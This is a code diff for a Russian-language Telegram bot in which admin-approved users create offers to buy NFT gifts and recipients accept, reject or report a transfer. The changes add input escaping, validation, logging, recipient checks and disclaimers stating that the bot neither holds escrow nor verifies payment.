@@ -2,6 +2,8 @@ import asyncio
 import os
 import random
 import string
+import logging
+import html
 
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import (
@@ -19,6 +21,12 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
+from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
+
+
+# =========================================================
+# НАСТРОЙКИ
+# =========================================================
 
 BOT_TOKEN = (
     os.environ.get("BOT_TOKEN")
@@ -27,6 +35,14 @@ BOT_TOKEN = (
 )
 
 ADMINS = {6977407005, 5068550043}
+
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+
+# =========================================================
+# ПРЕМИУМ-ЭМОДЗИ — ОРИГИНАЛЬНЫЕ ID
+# =========================================================
 
 EMOJI_MAP = {
     "👀": "5920052658743283381",
@@ -57,14 +73,31 @@ def e(text: str) -> str:
     return text
 
 
+def esc(value) -> str:
+    return html.escape(str(value or ""))
+
+
+# =========================================================
+# ВАЛЮТЫ
+# =========================================================
+
 CURRENCY_NAMES = {
-    "⭐": "Star",
-    "🪓": "Rub",
+    "⭐": "Stars",
+    "🪓": "RUB",
     "🔷": "Gram",
-    "💲": "Dollar",
+    "💲": "Dollars",
 }
 
-CURRENCIES = {"⭐", "🪓", "🔷", "💲"}
+CURRENCIES = set(CURRENCY_NAMES)
+
+
+def currency_name(symbol: str) -> str:
+    return CURRENCY_NAMES.get(symbol, symbol)
+
+
+# =========================================================
+# ТЕКСТЫ
+# =========================================================
 
 WELCOME = (
     "✈️ Добро пожаловать!\n\n"
@@ -82,7 +115,7 @@ T_USERNAME = (
 
 T_LINK = (
     "🗓️ Пришлите ссылку на подарок или несколько ссылок "
-    "(если подарков несколько — укажите каждый с новой строки)."
+    "(каждую ссылку укажите с новой строки)."
 )
 
 T_CURRENCY = "❓ Выберите валюту сделки."
@@ -97,22 +130,18 @@ T_CONFIRM = (
     "Если всё верно, нажмите кнопку ниже."
 )
 
-LANGUAGE_INDEPENDENT_TEXTS = {
-    "share": "Поделиться оффером",
-    "accept": "Принять",
-    "reject": "Отклонить",
-    "confirm": "Подтвердить оффер",
-    "back": "Назад",
-    "exit": "Выйти",
-    "transfer": "Подтвердить передачу",
-}
 
+# =========================================================
+# ХРАНИЛИЩА
+# =========================================================
 
 storage = MemoryStorage()
+
 bot = Bot(
     BOT_TOKEN,
     default=DefaultBotProperties(parse_mode=ParseMode.HTML)
 )
+
 dp = Dispatcher(storage=storage)
 
 verified_handles = set()
@@ -122,6 +151,10 @@ offers = {}
 pending_offers = {}
 
 
+# =========================================================
+# СОСТОЯНИЯ
+# =========================================================
+
 class OfferFlow(StatesGroup):
     username = State()
     link = State()
@@ -129,6 +162,10 @@ class OfferFlow(StatesGroup):
     amount = State()
     confirm = State()
 
+
+# =========================================================
+# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+# =========================================================
 
 def gen_id(n=8):
     return "TG-" + "".join(
@@ -138,26 +175,32 @@ def gen_id(n=8):
 
 def main_menu_kb():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(
-            text="Создать оффер",
-            callback_data="create_offer",
-            icon_custom_emoji_id=EMOJI_MAP["➕"]
-        )],
-        [InlineKeyboardButton(
-            text="Выйти",
-            callback_data="exit_main",
-            icon_custom_emoji_id=EMOJI_MAP["⬅️"]
-        )],
+        [
+            InlineKeyboardButton(
+                text="Создать оффер",
+                callback_data="create_offer",
+                icon_custom_emoji_id=EMOJI_MAP["➕"]
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                text="Выйти",
+                callback_data="exit_main",
+                icon_custom_emoji_id=EMOJI_MAP["⬅️"]
+            )
+        ],
     ])
 
 
 def back_kb(target):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(
-            text="Назад",
-            callback_data=f"back:{target}",
-            icon_custom_emoji_id=EMOJI_MAP["⬅️"]
-        )]
+        [
+            InlineKeyboardButton(
+                text="Назад",
+                callback_data=f"back:{target}",
+                icon_custom_emoji_id=EMOJI_MAP["⬅️"]
+            )
+        ]
     ])
 
 
@@ -165,12 +208,12 @@ def currency_kb():
     return InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(
-                text="Star",
+                text="Stars",
                 callback_data="cur:⭐",
                 icon_custom_emoji_id=EMOJI_MAP["⭐"]
             ),
             InlineKeyboardButton(
-                text="Rub",
+                text="RUB",
                 callback_data="cur:🪓",
                 icon_custom_emoji_id=EMOJI_MAP["🪓"]
             ),
@@ -182,58 +225,84 @@ def currency_kb():
                 icon_custom_emoji_id=EMOJI_MAP["🔷"]
             ),
             InlineKeyboardButton(
-                text="Dollar",
+                text="Dollars",
                 callback_data="cur:💲",
                 icon_custom_emoji_id=EMOJI_MAP["💲"]
             ),
         ],
-        [InlineKeyboardButton(
-            text="Назад",
-            callback_data="back:link",
-            icon_custom_emoji_id=EMOJI_MAP["⬅️"]
-        )],
+        [
+            InlineKeyboardButton(
+                text="Назад",
+                callback_data="back:link",
+                icon_custom_emoji_id=EMOJI_MAP["⬅️"]
+            )
+        ],
     ])
 
 
 def confirm_kb():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(
-            text="Подтвердить оффер",
-            callback_data="confirm_offer",
-            icon_custom_emoji_id=EMOJI_MAP["✅"]
-        )],
-        [InlineKeyboardButton(
-            text="Назад",
-            callback_data="back:amount",
-            icon_custom_emoji_id=EMOJI_MAP["⬅️"]
-        )],
+        [
+            InlineKeyboardButton(
+                text="Подтвердить оффер",
+                callback_data="confirm_offer",
+                icon_custom_emoji_id=EMOJI_MAP["✅"]
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                text="Назад",
+                callback_data="back:amount",
+                icon_custom_emoji_id=EMOJI_MAP["⬅️"]
+            )
+        ],
     ])
 
 
 def recipient_kb(oid):
-    # В сообщении получателя только две кнопки.
-    return InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(
-            text="Отклонить",
-            callback_data=f"reject:{oid}",
-            icon_custom_emoji_id=EMOJI_MAP["✖️"]
-        ),
-        InlineKeyboardButton(
-            text="Принять",
-            callback_data=f"accept:{oid}",
-            icon_custom_emoji_id=EMOJI_MAP["✅"]
-        ),
-    ]])
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(
+                text="Отклонить",
+                callback_data=f"reject:{oid}",
+                icon_custom_emoji_id=EMOJI_MAP["✖️"]
+            ),
+            InlineKeyboardButton(
+                text="Принять",
+                callback_data=f"accept:{oid}",
+                icon_custom_emoji_id=EMOJI_MAP["✅"]
+            ),
+        ]
+    ])
 
 
 def share_kb(oid):
-    # Кнопка поделиться доступна только создателю.
-    return InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(
-            text="Поделиться оффером",
-            switch_inline_query=f"offer_{oid}",
-            icon_custom_emoji_id=EMOJI_MAP["✈️"]
-        )]
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(
+                text="Поделиться оффером",
+                switch_inline_query=f"offer_{oid}",
+                icon_custom_emoji_id=EMOJI_MAP["✈️"]
+            )
+        ]
+    ])
+
+
+def transfer_kb(oid):
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(
+                text="Transfer NFT",
+                url="https://t.me/nft"
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                text="Подтвердить передачу",
+                callback_data=f"transfer:{oid}",
+                icon_custom_emoji_id=EMOJI_MAP["✅"]
+            )
+        ],
     ])
 
 
@@ -244,11 +313,106 @@ def make_share_text(oid):
 
     return (
         "✈️ Оффер\n\n"
-        f"Пользователь @{offer['creator_username']} предлагает:\n\n"
-        f"👛 Сумма: {offer['amount']} {offer['currency']}\n"
-        f"🎁 Подарок:\n{offer['link']}\n\n"
+        f"Пользователь @{esc(offer['creator_username'])} предлагает:\n\n"
+        f"👛 Сумма: {offer['amount']} "
+        f"{esc(currency_name(offer['currency']))}\n"
+        f"🎁 Подарок:\n{esc(offer['link'])}\n\n"
         "Выберите действие:"
     )
+
+
+def make_deal_text(offer):
+    return (
+        "📜 <b>Сделка по NFT</b>\n"
+        f"Заказ #{esc(offer['deal_id'])}\n\n"
+        f"Сумма оффера: <b>{offer['amount']} "
+        f"{esc(currency_name(offer['currency']))}</b>\n\n"
+        "Перед продолжением самостоятельно проверьте условия сделки "
+        "и наличие оплаты. Это сообщение не подтверждает получение "
+        "средств и не гарантирует автоматическую выплату.\n\n"
+        "Инструкции:\n\n"
+        f"1. Проверьте подарок: {esc(offer['link'])}\n"
+        "2. Передавайте подарок только после проверки условий "
+        "и получения подтверждения оплаты.\n"
+        "3. Не нажимайте подтверждение, если передача фактически "
+        "не состоялась.\n\n"
+        "Бот не выполняет автоматическое эскроу-зачисление."
+    )
+
+
+async def safe_edit_message(
+    cb: CallbackQuery,
+    text: str,
+    reply_markup=None
+):
+    """
+    Работает как с обычным сообщением, так и с сообщением,
+    отправленным через inline-режим.
+    """
+    if cb.message:
+        try:
+            await cb.message.edit_text(
+                text,
+                reply_markup=reply_markup
+            )
+            return True
+        except TelegramBadRequest as exc:
+            if "message is not modified" in str(exc).lower():
+                return True
+            logger.warning("Не удалось отредактировать сообщение: %s", exc)
+        except Exception:
+            logger.exception("Ошибка редактирования сообщения")
+
+    if cb.inline_message_id:
+        try:
+            await bot.edit_message_text(
+                inline_message_id=cb.inline_message_id,
+                text=text,
+                reply_markup=reply_markup
+            )
+            return True
+        except TelegramBadRequest as exc:
+            if "message is not modified" in str(exc).lower():
+                return True
+            logger.warning("Ошибка редактирования inline-сообщения: %s", exc)
+        except Exception:
+            logger.exception("Ошибка inline-редактирования")
+
+    return False
+
+
+async def safe_remove_keyboard(cb: CallbackQuery):
+    if cb.message:
+        try:
+            await cb.message.edit_reply_markup(reply_markup=None)
+            return
+        except Exception:
+            logger.exception("Не удалось убрать клавиатуру")
+
+    if cb.inline_message_id:
+        try:
+            await bot.edit_message_reply_markup(
+                inline_message_id=cb.inline_message_id,
+                reply_markup=None
+            )
+        except Exception:
+            logger.exception("Не удалось убрать inline-клавиатуру")
+
+
+async def notify_creator(offer, text):
+    creator_id = offer.get("creator_id")
+    if not creator_id:
+        return
+
+    try:
+        await bot.send_message(creator_id, text)
+    except TelegramForbiddenError:
+        logger.info(
+            "Создатель %s ещё не начал диалог с ботом",
+            creator_id
+        )
+    except Exception:
+        logger.exception("Не удалось уведомить создателя")
 
 
 async def send_offer_to_recipient(recipient_id, oid):
@@ -258,9 +422,10 @@ async def send_offer_to_recipient(recipient_id, oid):
 
     text = (
         "✈️ Вам поступил оффер!\n\n"
-        f"Пользователь @{offer['creator_username']} предлагает:\n\n"
-        f"👛 Сумма: {offer['amount']} {offer['currency']}\n"
-        f"🎁 Подарок:\n{offer['link']}\n\n"
+        f"Пользователь @{esc(offer['creator_username'])} предлагает:\n\n"
+        f"👛 Сумма: {offer['amount']} "
+        f"{esc(currency_name(offer['currency']))}\n"
+        f"🎁 Подарок:\n{esc(offer['link'])}\n\n"
         "Выберите действие:"
     )
 
@@ -271,65 +436,113 @@ async def send_offer_to_recipient(recipient_id, oid):
     )
 
 
+# =========================================================
+# START — ГЛАВНОЕ МЕНЮ ДОСТУПНО ВСЕМ
+# =========================================================
+
 @dp.message(CommandStart())
 async def cmd_start(message: Message, state: FSMContext):
     await state.clear()
 
-    uid = message.from_user.id
+    user = message.from_user
+    if not user:
+        return
+
+    uid = user.id
     started_users.add(uid)
 
-    if message.from_user.username:
-        username_to_id[message.from_user.username.lower()] = uid
+    if user.username:
+        username_to_id[user.username.lower()] = uid
 
-    await message.answer(e("🔷"))
-    await message.answer(e(WELCOME), reply_markup=main_menu_kb())
+    # Эмодзи отправляется отдельно.
+    try:
+        await message.answer(e("🔷"))
+    except Exception:
+        logger.exception("Ошибка отправки стартового эмодзи")
 
-    username = (message.from_user.username or "").lower()
+    # Меню отправляется ВСЕМ пользователям.
+    # У обычных пользователей здесь нет проверки verified_handles.
+    try:
+        await message.answer(
+            e(WELCOME),
+            reply_markup=main_menu_kb()
+        )
+    except Exception:
+        logger.exception("Ошибка меню с премиум-эмодзи")
+
+        # Резервное меню без форматирования и custom emoji.
+        try:
+            await message.answer(
+                "Добро пожаловать!\n\n"
+                "Создавайте офферы и отправляйте предложения "
+                "другим пользователям.\n\n"
+                "После сделки свяжитесь с администратором "
+                "по вопросам выплаты.",
+                reply_markup=main_menu_kb(),
+                parse_mode=None
+            )
+        except Exception:
+            logger.exception("Не удалось отправить главное меню")
+
+    username = (user.username or "").lower()
 
     if username in pending_offers:
         for oid in list(pending_offers[username]):
             offer = offers.get(oid)
+
             if offer and offer["status"] == "pending":
                 try:
                     await send_offer_to_recipient(uid, oid)
                 except Exception:
-                    pass
+                    logger.exception(
+                        "Ошибка доставки оффера %s",
+                        oid
+                    )
 
         pending_offers.pop(username, None)
 
+
+# =========================================================
+# СОЗДАНИЕ ОФФЕРА
+# =========================================================
 
 @dp.callback_query(F.data == "create_offer")
 async def cb_create_offer(cb: CallbackQuery, state: FSMContext):
     uid = cb.from_user.id
 
+    # Доступ проверяется только здесь, а не при /start.
     if uid not in ADMINS:
         username = (cb.from_user.username or "").lower()
 
         if username not in verified_handles:
-            await cb.answer(
-                "Вы не верифицированы для создания офферов. "
-                "Заявка отправлена администраторам.",
-                show_alert=True
-            )
-
             for admin_id in ADMINS:
                 try:
-                    await cb.bot.send_message(
+                    await bot.send_message(
                         admin_id,
-                        f"Запрос на доступ к созданию офферов.\n"
-                        f"Пользователь: @{cb.from_user.username or uid}\n"
+                        "Запрос на доступ к созданию офферов.\n"
+                        f"Пользователь: @{esc(cb.from_user.username or str(uid))}\n"
                         f"ID: {uid}"
                     )
                 except Exception:
-                    pass
+                    logger.exception(
+                        "Не удалось отправить запрос администратору"
+                    )
 
+            await cb.answer(
+                "Нет доступа к созданию офферов. "
+                "Запрос отправлен администраторам.",
+                show_alert=True
+            )
             return
 
     await state.set_state(OfferFlow.username)
-    await cb.message.edit_text(
-        e(T_USERNAME),
-        reply_markup=back_kb("main")
-    )
+
+    if cb.message:
+        await cb.message.edit_text(
+            e(T_USERNAME),
+            reply_markup=back_kb("main")
+        )
+
     await cb.answer()
 
 
@@ -337,10 +550,11 @@ async def cb_create_offer(cb: CallbackQuery, state: FSMContext):
 async def cb_exit_main(cb: CallbackQuery, state: FSMContext):
     await state.clear()
 
-    try:
-        await cb.message.delete()
-    except Exception:
-        pass
+    if cb.message:
+        try:
+            await cb.message.delete()
+        except Exception:
+            await safe_edit_message(cb, e(WELCOME), main_menu_kb())
 
     await cb.answer()
 
@@ -351,37 +565,42 @@ async def cb_back(cb: CallbackQuery, state: FSMContext):
 
     if target == "main":
         await state.clear()
-        await cb.message.edit_text(
+        await safe_edit_message(
+            cb,
             e(WELCOME),
-            reply_markup=main_menu_kb()
+            main_menu_kb()
         )
 
     elif target == "username":
         await state.set_state(OfferFlow.username)
-        await cb.message.edit_text(
+        await safe_edit_message(
+            cb,
             e(T_USERNAME),
-            reply_markup=back_kb("main")
+            back_kb("main")
         )
 
     elif target == "link":
         await state.set_state(OfferFlow.link)
-        await cb.message.edit_text(
+        await safe_edit_message(
+            cb,
             e(T_LINK),
-            reply_markup=back_kb("username")
+            back_kb("username")
         )
 
     elif target == "currency":
         await state.set_state(OfferFlow.currency)
-        await cb.message.edit_text(
+        await safe_edit_message(
+            cb,
             e(T_CURRENCY),
-            reply_markup=currency_kb()
+            currency_kb()
         )
 
     elif target == "amount":
         await state.set_state(OfferFlow.amount)
-        await cb.message.edit_text(
+        await safe_edit_message(
+            cb,
             e(T_AMOUNT),
-            reply_markup=back_kb("currency")
+            back_kb("currency")
         )
 
     await cb.answer()
@@ -391,11 +610,25 @@ async def cb_back(cb: CallbackQuery, state: FSMContext):
 async def msg_username(message: Message, state: FSMContext):
     text = (message.text or "").strip()
 
-    if not text.startswith("@") or len(text) < 2:
-        await message.answer("Пришлите @username.")
+    if text.startswith("https://t.me/"):
+        text = "@" + text.removeprefix("https://t.me/").split("/")[0]
+
+    if text.startswith("t.me/"):
+        text = "@" + text.removeprefix("t.me/").split("/")[0]
+
+    username = text.lstrip("@").split("/")[0].split("?")[0]
+
+    if not username or not all(
+        char.isalnum() or char == "_" for char in username
+    ):
+        await message.answer("Пришлите корректный @username.")
         return
 
-    await state.update_data(recipient=text)
+    if len(username) < 5 or len(username) > 32:
+        await message.answer("Проверьте длину username и отправьте его снова.")
+        return
+
+    await state.update_data(recipient="@" + username)
     await state.set_state(OfferFlow.link)
 
     await message.answer(
@@ -412,7 +645,22 @@ async def msg_link(message: Message, state: FSMContext):
         await message.answer(e(T_LINK))
         return
 
-    await state.update_data(link=link)
+    links = [line.strip() for line in link.splitlines() if line.strip()]
+
+    if not links:
+        await message.answer(e(T_LINK))
+        return
+
+    if any(
+        not item.startswith(("https://t.me/", "http://t.me/", "t.me/"))
+        for item in links
+    ):
+        await message.answer(
+            "Отправьте ссылку на подарок в формате t.me/..."
+        )
+        return
+
+    await state.update_data(link="\n".join(links))
     await state.set_state(OfferFlow.currency)
 
     await message.answer(
@@ -432,10 +680,12 @@ async def cb_currency(cb: CallbackQuery, state: FSMContext):
     await state.update_data(currency=currency)
     await state.set_state(OfferFlow.amount)
 
-    await cb.message.edit_text(
+    await safe_edit_message(
+        cb,
         e(T_AMOUNT),
-        reply_markup=back_kb("currency")
+        back_kb("currency")
     )
+
     await cb.answer()
 
 
@@ -444,7 +694,7 @@ async def msg_amount(message: Message, state: FSMContext):
     text = (message.text or "").strip()
 
     if not text.isdigit():
-        await message.answer("Введите целое число.")
+        await message.answer("Введите сумму целым положительным числом.")
         return
 
     amount = int(text)
@@ -460,9 +710,9 @@ async def msg_amount(message: Message, state: FSMContext):
 
     preview = (
         f"{T_CONFIRM}\n\n"
-        f"Получатель: {data['recipient']}\n"
-        f"Подарок:\n{data['link']}\n"
-        f"Сумма: {data['amount']} {data['currency']}"
+        f"Получатель: {esc(data['recipient'])}\n"
+        f"Подарок:\n{esc(data['link'])}\n"
+        f"Сумма: {amount} {esc(currency_name(data['currency']))}"
     )
 
     await message.answer(
@@ -486,46 +736,59 @@ async def cb_confirm(cb: CallbackQuery, state: FSMContext):
         return
 
     oid = gen_id()
+    recipient_username = data["recipient"].lstrip("@").lower()
 
     offer = {
         "id": oid,
+        "deal_id": gen_id(),
         "creator_id": uid,
         "creator_username": cb.from_user.username or str(uid),
         "recipient": data["recipient"],
+        "recipient_username": recipient_username,
+        "recipient_id": username_to_id.get(recipient_username),
         "link": data["link"],
         "currency": data["currency"],
         "amount": data["amount"],
         "status": "pending",
+        "accepted_by": None,
     }
 
     offers[oid] = offer
     await state.clear()
 
-    username = data["recipient"].lstrip("@").lower()
-    recipient_id = username_to_id.get(username)
+    recipient_id = offer["recipient_id"]
 
     if recipient_id:
         try:
             await send_offer_to_recipient(recipient_id, oid)
         except Exception:
-            pending_offers.setdefault(username, []).append(oid)
+            logger.exception("Не удалось отправить оффер напрямую")
+            pending_offers.setdefault(recipient_username, []).append(oid)
     else:
-        pending_offers.setdefault(username, []).append(oid)
+        pending_offers.setdefault(recipient_username, []).append(oid)
 
     notify = (
         "✈️ Оффер создан!\n\n"
-        f"Получатель: {data['recipient']}\n"
-        f"Сумма: {data['amount']} {data['currency']}\n"
-        f"Подарок:\n{data['link']}\n\n"
-        "Вы можете поделиться оффером с другим пользователем."
+        f"Получатель: {esc(data['recipient'])}\n"
+        f"Сумма: {data['amount']} "
+        f"{esc(currency_name(data['currency']))}\n"
+        f"Подарок:\n{esc(data['link'])}\n\n"
+        "Нажмите «Поделиться оффером», чтобы отправить его "
+        "в чат Telegram."
     )
 
-    await cb.message.edit_text(
+    await safe_edit_message(
+        cb,
         e(notify),
-        reply_markup=share_kb(oid)
+        share_kb(oid)
     )
+
     await cb.answer("Оффер создан!")
 
+
+# =========================================================
+# INLINE-РЕЖИМ ДЛЯ ПОДЕЛИТЬСЯ ОФФЕРОМ
+# =========================================================
 
 @dp.inline_query()
 async def inline_offer(query: InlineQuery):
@@ -542,7 +805,6 @@ async def inline_offer(query: InlineQuery):
         await query.answer([], cache_time=1, is_personal=True)
         return
 
-    # Только создатель может сформировать результат для публикации.
     if query.from_user.id != offer["creator_id"]:
         await query.answer([], cache_time=1, is_personal=True)
         return
@@ -551,7 +813,7 @@ async def inline_offer(query: InlineQuery):
 
     result = InlineQueryResultArticle(
         id=oid,
-        title=f"Оффер: {offer['amount']} {offer['currency']}",
+        title=f"Оффер: {offer['amount']} {currency_name(offer['currency'])}",
         description=f"Подарок: {offer['link'][:80]}",
         input_message_content=InputTextMessageContent(
             message_text=e(text),
@@ -566,6 +828,10 @@ async def inline_offer(query: InlineQuery):
         is_personal=True
     )
 
+
+# =========================================================
+# ОТКЛОНЕНИЕ ОФФЕРА
+# =========================================================
 
 @dp.callback_query(F.data.startswith("reject:"))
 async def cb_reject(cb: CallbackQuery):
@@ -582,17 +848,29 @@ async def cb_reject(cb: CallbackQuery):
 
     offer["status"] = "rejected"
 
-    try:
-        await cb.message.edit_reply_markup(reply_markup=None)
-    except Exception:
-        pass
+    await safe_edit_message(
+        cb,
+        "✖️ Оффер отклонён.\n\n"
+        f"Номер оффера: {esc(oid)}",
+        reply_markup=None
+    )
+
+    await notify_creator(
+        offer,
+        "✖️ Ваш оффер отклонён.\n\n"
+        f"Оффер: {esc(oid)}\n"
+        f"Получатель: @{esc(cb.from_user.username or str(cb.from_user.id))}"
+    )
 
     await cb.answer("Оффер отклонён.")
 
 
+# =========================================================
+# ПРИНЯТИЕ ОФФЕРА
+# =========================================================
+
 @dp.callback_query(F.data.startswith("accept:"))
 async def cb_accept(cb: CallbackQuery):
-    uid = cb.from_user.id
     oid = cb.data.split(":", 1)[1]
     offer = offers.get(oid)
 
@@ -604,40 +882,44 @@ async def cb_accept(cb: CallbackQuery):
         await cb.answer("Оффер уже закрыт.", show_alert=True)
         return
 
-    await cb.answer(
-        "Перед продолжением проверьте условия сделки.",
-        show_alert=True
+    # Если оффер адресован конкретному пользователю,
+    # принимающий должен совпадать с ним.
+    expected_username = offer.get("recipient_username", "")
+    actual_username = (cb.from_user.username or "").lower()
+
+    if expected_username and actual_username != expected_username:
+        await cb.answer(
+            "Этот оффер предназначен другому пользователю.",
+            show_alert=True
+        )
+        return
+
+    offer["status"] = "accepted"
+    offer["accepted_by"] = cb.from_user.id
+
+    text = make_deal_text(offer)
+
+    await safe_edit_message(
+        cb,
+        e(text),
+        reply_markup=transfer_kb(oid)
     )
 
-    trade_id = gen_id()
-
-    text = (
-        f"📜 Сделка по NFT. Заказ #{trade_id}\n\n"
-        f"Создатель оффера: @{offer['creator_username']}\n"
-        f"Сумма: {offer['amount']} {offer['currency']}\n"
-        f"Подарок:\n{offer['link']}\n\n"
-        "Внимательно проверьте условия сделки перед передачей подарка."
+    await notify_creator(
+        offer,
+        "✅ Ваш оффер принят!\n\n"
+        f"Номер сделки: {esc(offer['deal_id'])}\n"
+        f"Сумма: {offer['amount']} "
+        f"{esc(currency_name(offer['currency']))}\n"
+        "Проверьте условия сделки и оплату перед передачей подарка."
     )
 
-    kb = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(
-            text="Подтвердить передачу",
-            callback_data=f"transfer:{oid}",
-            icon_custom_emoji_id=EMOJI_MAP["✅"]
-        )
-    ]])
+    await cb.answer("Оффер принят!")
 
-    try:
-        await cb.message.edit_text(
-            e(text),
-            reply_markup=kb
-        )
-    except Exception:
-        await cb.message.answer(
-            e(text),
-            reply_markup=kb
-        )
 
+# =========================================================
+# ПОДТВЕРЖДЕНИЕ ПЕРЕДАЧИ
+# =========================================================
 
 @dp.callback_query(F.data.startswith("transfer:"))
 async def cb_transfer(cb: CallbackQuery):
@@ -648,33 +930,83 @@ async def cb_transfer(cb: CallbackQuery):
         await cb.answer("Оффер не найден.", show_alert=True)
         return
 
-    if offer["status"] != "pending":
-        await cb.answer("Оффер уже закрыт.", show_alert=True)
+    if offer["status"] != "accepted":
+        await cb.answer(
+            "Сделка не находится на этапе передачи.",
+            show_alert=True
+        )
         return
 
-    offer["status"] = "completed"
+    if cb.from_user.id != offer.get("accepted_by"):
+        await cb.answer(
+            "Подтвердить передачу может только принявший оффер.",
+            show_alert=True
+        )
+        return
 
-    await cb.message.edit_text(
-        e("👛 Подтверждение получено. Убедитесь, что условия сделки выполнены.")
+    # Эта кнопка фиксирует только нажатие в боте.
+    # Она не проверяет реальную передачу NFT и не подтверждает оплату.
+    offer["status"] = "transfer_reported"
+
+    await safe_edit_message(
+        cb,
+        "📜 Передача отмечена пользователем.\n\n"
+        f"Заказ #{esc(offer['deal_id'])}\n\n"
+        "Бот не проверил фактическую передачу NFT или оплату. "
+        "Перед закрытием сделки убедитесь, что все условия выполнены.",
+        reply_markup=None
     )
-    await cb.answer("Готово!")
 
+    await notify_creator(
+        offer,
+        "📜 Получатель отметил передачу по сделке.\n\n"
+        f"Заказ #{esc(offer['deal_id'])}\n"
+        "Это уведомление не является подтверждением оплаты."
+    )
+
+    for admin_id in ADMINS:
+        try:
+            await bot.send_message(
+                admin_id,
+                "📜 Пользователь отметил передачу по сделке.\n"
+                f"Оффер: {esc(oid)}\n"
+                f"Заказ: {esc(offer['deal_id'])}\n"
+                f"Сумма: {offer['amount']} "
+                f"{esc(currency_name(offer['currency']))}\n"
+                f"Создатель ID: {offer['creator_id']}\n"
+                f"Получатель ID: {offer['accepted_by']}\n\n"
+                "Требуется ручная проверка."
+            )
+        except Exception:
+            logger.exception("Не удалось уведомить администратора")
+
+    await cb.answer("Статус передачи обновлён.")
+
+
+# =========================================================
+# АДМИНИСТРАТИВНЫЕ КОМАНДЫ
+# =========================================================
 
 @dp.message(Command("dostup"))
 async def cmd_dostup(message: Message):
     if message.from_user.id not in ADMINS:
         return
 
-    parts = message.text.split(maxsplit=1)
+    parts = (message.text or "").split(maxsplit=1)
 
     if len(parts) < 2:
         await message.answer("Использование: /dostup @username")
         return
 
     username = parts[1].strip().lstrip("@").lower()
+
+    if not username:
+        await message.answer("Укажите username.")
+        return
+
     verified_handles.add(username)
 
-    await message.answer(f"Доступ выдан @{username}")
+    await message.answer(f"Доступ к созданию офферов выдан @{esc(username)}")
 
 
 @dp.message(Command("undostup"))
@@ -682,7 +1014,7 @@ async def cmd_undostup(message: Message):
     if message.from_user.id not in ADMINS:
         return
 
-    parts = message.text.split(maxsplit=1)
+    parts = (message.text or "").split(maxsplit=1)
 
     if len(parts) < 2:
         await message.answer("Использование: /undostup @username")
@@ -691,7 +1023,7 @@ async def cmd_undostup(message: Message):
     username = parts[1].strip().lstrip("@").lower()
     verified_handles.discard(username)
 
-    await message.answer(f"Доступ снят с @{username}")
+    await message.answer(f"Доступ к созданию офферов снят с @{esc(username)}")
 
 
 @dp.message(Command("m"))
@@ -699,7 +1031,7 @@ async def cmd_m(message: Message):
     if message.from_user.id not in ADMINS:
         return
 
-    parts = message.text.split(maxsplit=1)
+    parts = (message.text or "").split(maxsplit=1)
 
     if len(parts) < 2:
         await message.answer("Использование: /m текст")
@@ -709,14 +1041,14 @@ async def cmd_m(message: Message):
 
     for uid in list(started_users):
         try:
-            await message.bot.send_message(
+            await bot.send_message(
                 uid,
                 parts[1],
                 parse_mode=None
             )
             sent += 1
         except Exception:
-            pass
+            logger.exception("Не удалось отправить сообщение %s", uid)
 
     await message.answer(f"Отправлено: {sent}")
 
@@ -729,7 +1061,7 @@ async def cmd_offers(message: Message):
     active = {
         oid: offer
         for oid, offer in offers.items()
-        if offer["status"] == "pending"
+        if offer["status"] in ("pending", "accepted")
     }
 
     if not active:
@@ -741,20 +1073,32 @@ async def cmd_offers(message: Message):
     for oid, offer in active.items():
         lines.append(
             f"#{oid} | @{offer['creator_username']} → "
-            f"{offer['recipient']} | {offer['amount']} {offer['currency']}"
+            f"{offer['recipient']} | {offer['amount']} "
+            f"{currency_name(offer['currency'])} | {offer['status']}"
         )
 
-    await message.answer("\n".join(lines))
+    await message.answer("\n".join(lines), parse_mode=None)
 
+
+# =========================================================
+# РЕГИСТРАЦИЯ ПОЛЬЗОВАТЕЛЕЙ
+# =========================================================
 
 @dp.message()
 async def track_user(message: Message):
     if not message.from_user:
         return
 
-    if message.from_user.username:
-        username_to_id[message.from_user.username.lower()] = message.from_user.id
+    user = message.from_user
+    started_users.add(user.id)
 
+    if user.username:
+        username_to_id[user.username.lower()] = user.id
+
+
+# =========================================================
+# ЗАПУСК
+# =========================================================
 
 async def main():
     if not BOT_TOKEN or ":" not in BOT_TOKEN:
@@ -764,6 +1108,9 @@ async def main():
         )
 
     await bot.delete_webhook(drop_pending_updates=True)
+
+    logger.info("Бот запускается")
+
     await dp.start_polling(bot)
 
 
